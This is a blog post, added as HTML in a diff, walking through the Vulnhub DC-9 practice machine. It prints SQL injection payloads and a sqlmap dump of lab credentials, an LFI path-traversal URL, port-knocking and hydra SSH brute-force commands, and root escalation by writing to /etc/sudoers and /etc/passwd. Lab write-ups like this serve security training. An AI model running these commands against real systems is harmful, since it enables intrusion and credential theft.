@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Difficulty: EasyVirtual Machine Address:https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-9,412&#x2F; Targetroot privilege Access Applicationnmap -Pn 10.0.2.4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub DC-9412">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack%20[15].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="Difficulty: EasyVirtual Machine Address:https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-9,412&#x2F; Targetroot privilege Access Applicationnmap -Pn 10.0.2.4">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlBgblNKYnGjvYiUzVD2KHUnNsJn.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiYT3rZ8TFuuhniT3Itwn8PZPdbQ.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frxhmv0YhXReydwqPpJfIJC9PzPF.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu-8yFymrXrBDuQNs65v2HfCOIzn.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqTZ2xeHZoBpybGy_CvKk1M7ctaz.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu0Ypf0gvDvPrfxm0gE6gI9sqt6D.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgvdjWiTIjVlfy5jv534dbhbfkwI.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhAjnougwYFm5Nk5-Jbg3r2Y7iHs.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgLIYS37-hrmuIpxep9cK8xnGdXS.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvocW0cekPKoYcTi8amHZl3UbTPQ.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtXWVLxuEISP2JV11RC4siPvNQ5m.png">
+<meta property="article:published_time" content="2022-11-27T23:39:33.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:12.758Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Penetration Test">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlBgblNKYnGjvYiUzVD2KHUnNsJn.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Vulnhub DC-9412</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/%5BMalware-Analysis%5D%20Static%20Analysis%201.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Simple%20OS%20kernel.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[15].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&text=Vulnhub DC-9412"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&is_video=false&description=Vulnhub DC-9412"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vulnhub DC-9412&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[15].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&name=Vulnhub DC-9412&description=&lt;p&gt;Difficulty: Easy&lt;br&gt;Virtual Machine Address:&lt;br&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/dc-9,412/&#34;&gt;https://www.vulnhub.com/entry/dc-9,412/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;p&gt;root privilege&lt;/p&gt;
+&lt;h2 id=&#34;Access-Application&#34;&gt;&lt;a href=&#34;#Access-Application&#34; class=&#34;headerlink&#34; title=&#34;Access Application&#34;&gt;&lt;/a&gt;Access Application&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-Pn&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.0&lt;/span&gt;.2.4&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[15].html&t=Vulnhub DC-9412"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Target"><span class="toc-number">1.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Access-Application"><span class="toc-number">2.</span> <span class="toc-text">Access Application</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-shell"><span class="toc-number">3.</span> <span class="toc-text">Get shell</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Vulnhub DC-9412
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-27T23:39:33.000Z" class="dt-published" itemprop="datePublished">2022-11-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Penetration-Test/" rel="tag">Penetration Test</a>, <a class="p-category" href="/tags/Vulnhub/" rel="tag">Vulnhub</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Difficulty: Easy<br>Virtual Machine Address:<br><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p>
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>root privilege</p>
+<h2 id="Access-Application"><a href="#Access-Application" class="headerlink" title="Access Application"></a>Access Application</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-Pn</span> <span class="token number">10.0</span>.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<span id="more"></span>
+
+<p>In the <code>search.php</code> , we can search something in it.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlBgblNKYnGjvYiUzVD2KHUnNsJn.png"></p>
+<p>In <code>display.php</code> we can found the infomation in the application.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiYT3rZ8TFuuhniT3Itwn8PZPdbQ.png"></p>
+<p>We can use <code>sqlmap</code> to discover more sentive infomation.</p>
+<p><code>Boolean-based blind</code> and <code>time-based blind</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:
+---
+Parameter: search <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: <span class="token assign-left variable">search</span><span class="token operator">=</span>Moe<span class="token string">' AND 4391=4391 AND '</span>tkRy<span class="token string">'='</span>tkRy
+
+    Type: time-based blind
+    Title: MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
+    Payload: <span class="token assign-left variable">search</span><span class="token operator">=</span>Moe<span class="token string">' AND (SELECT 7894 FROM (SELECT(SLEEP(5)))QUdw) AND '</span>qgGb<span class="token string">'='</span>qgGb
+---
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span> <span class="token parameter variable">-D</span> <span class="token function">users</span> <span class="token parameter variable">-T</span> UserDetails <span class="token parameter variable">--columns</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>We can get the usernames and passwords</p>
+<pre class="line-numbers language-none"><code class="language-none">+----+------------+---------------+---------------------+-----------+-----------+
+| id | lastname   | password      | reg_date            | username  | firstname |
++----+------------+---------------+---------------------+-----------+-----------+
+| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
+| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
+| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
+| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
+| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
+| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
+| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
+| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
+| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
+| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
+| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
+| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
+| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
+| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
+| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
+| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
+| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
++----+------------+---------------+---------------------+-----------+-----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We can found the website <code>admin</code> information<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frxhmv0YhXReydwqPpJfIJC9PzPF.png"></p>
+<p><strong>Decode the md5 hash</strong><br><a target="_blank" rel="noopener" href="https://www.md5online.org/md5-decrypt.html">https://www.md5online.org/md5-decrypt.html</a><br>Found : transorbital1<br>(hash &#x3D; 856f5de590ef37314e7c3bdf6f8a66dc)</p>
+<p>After we login the admin account, threre is a rabit hole <code>add record</code><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu-8yFymrXrBDuQNs65v2HfCOIzn.png"></p>
+<p><strong>Add Record ( Rabit Hole )</strong></p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqTZ2xeHZoBpybGy_CvKk1M7ctaz.png"></p>
+<p>If we input the php command in the blank whatever Firstname, Lastname, etc. . When the web apalication will get the information including mailcious code <code>getshell</code> or <code>leaking sensitive info</code><br>the html will load the php command. That’s my thought, but it failed.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu0Ypf0gvDvPrfxm0gE6gI9sqt6D.png"></p>
+<p><strong>File does not exist</strong><br>You will be attracted by the hint first time. But how we can use this hint to expand our attack surface?<br>We get this error in the footer section stating File does not exist this gave me a hint about usage of include() in PHP which might be exploitable for <code>LFI</code>.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgvdjWiTIjVlfy5jv534dbhbfkwI.png"></p>
+<p>After looking around I found out that there was knockd.conf present meaning we can read that using LFI and then use those credentials to login via SSH.</p>
+<p>If we visit IP <code>/manage.php?file=../../../../../../../../etc/knockd.conf</code> we can see the content of the knockd.conf and the sequence to open SSH is 7469,8475,9842</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhAjnougwYFm5Nk5-Jbg3r2Y7iHs.png"></p>
+<p><strong>How we knock the SSH door?</strong><br>Here is the article for ssh knocking.<br><a target="_blank" rel="noopener" href="https://www.tecmint.com/port-knocking-to-secure-ssh/">https://www.tecmint.com/port-knocking-to-secure-ssh/</a><br>There are 2 commands to open the ssh door.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">knock <span class="token parameter variable">-v</span> <span class="token number">10.0</span>.2.4 <span class="token number">7469</span> <span class="token number">8475</span> <span class="token number">9842</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">x</span> <span class="token keyword">in</span> <span class="token number">7469</span> <span class="token number">8475</span> <span class="token number">9842</span><span class="token punctuation">;</span> <span class="token keyword">do</span> nmap <span class="token parameter variable">-Pn</span> --max-retries <span class="token number">0</span> <span class="token parameter variable">-p</span> <span class="token variable">$x</span> <span class="token number">10.0</span>.2.4<span class="token punctuation">;</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>When we open the door, do I get the user or password already? The answer is yes ! We get the information when we use <code>sqlmap</code> to get admin password.</p>
+<p>The password file might be not the same as we got.<br>Actually when we login in as <code>janitor</code>, we can find the secret password file in the hidden directory.</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FgLIYS37-hrmuIpxep9cK8xnGdXS.png"></p>
+<p>We can try any possibilities to crack the ssh door.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> user.txt <span class="token parameter variable">-P</span> password.txt ssh://10.0.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvocW0cekPKoYcTi8amHZl3UbTPQ.png"></p>
+<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>when we login as <code>fredf</code>, we will find the way to escalate the privilege.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">## sudo -l</span>
+User fredf may run the following commands on dc-9:
+    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /opt/devstuff/dist/test/test
+    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>After we run the <code>/opt/devstuff/dist/test/test</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Usage: python test.py <span class="token builtin class-name">read</span> append<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>The binary software is append the file. So we can append <code>/etc/sudoers</code> or <code>/etc/passwd</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-en</span> <span class="token string">"fredf ALL=(ALL:ALL) ALL"</span> <span class="token operator">></span> payload.txt
+<span class="token function">sudo</span> /opt/devstuff/dist/test/test payload.txt /etc/sudoers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> l3vi4th4n <span class="token number">123456</span>
+<span class="token punctuation">[</span>output<span class="token punctuation">]</span> <span class="token variable">$1</span><span class="token variable">$l3vi4th4</span><span class="token variable">$IFdDftj0TAc1LLxP5OlsF0</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"l3vi4th4n:<span class="token variable">$1</span><span class="token variable">$l3vi4th4</span><span class="token variable">$IFdDftj0TAc1LLxP5OlsF0</span>:0:0:root:/root:/bin/bash"</span> <span class="token operator">></span> payload1.txt
+<span class="token function">sudo</span> /opt/devstuff/dist/test/test payload.txt /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>And we finally get the root flag :-)<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtXWVLxuEISP2JV11RC4siPvNQ5m.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Target"><span class="toc-number">1.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Access-Application"><span class="toc-number">2.</span> <span class="toc-text">Access Application</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-shell"><span class="toc-number">3.</span> <span class="toc-text">Get shell</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[15].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&text=Vulnhub DC-9412"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&is_video=false&description=Vulnhub DC-9412"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vulnhub DC-9412&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[15].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&title=Vulnhub DC-9412"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[15].html&name=Vulnhub DC-9412&description=&lt;p&gt;Difficulty: Easy&lt;br&gt;Virtual Machine Address:&lt;br&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/dc-9,412/&#34;&gt;https://www.vulnhub.com/entry/dc-9,412/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;p&gt;root privilege&lt;/p&gt;
+&lt;h2 id=&#34;Access-Application&#34;&gt;&lt;a href=&#34;#Access-Application&#34; class=&#34;headerlink&#34; title=&#34;Access Application&#34;&gt;&lt;/a&gt;Access Application&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-Pn&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.0&lt;/span&gt;.2.4&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[15].html&t=Vulnhub DC-9412"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
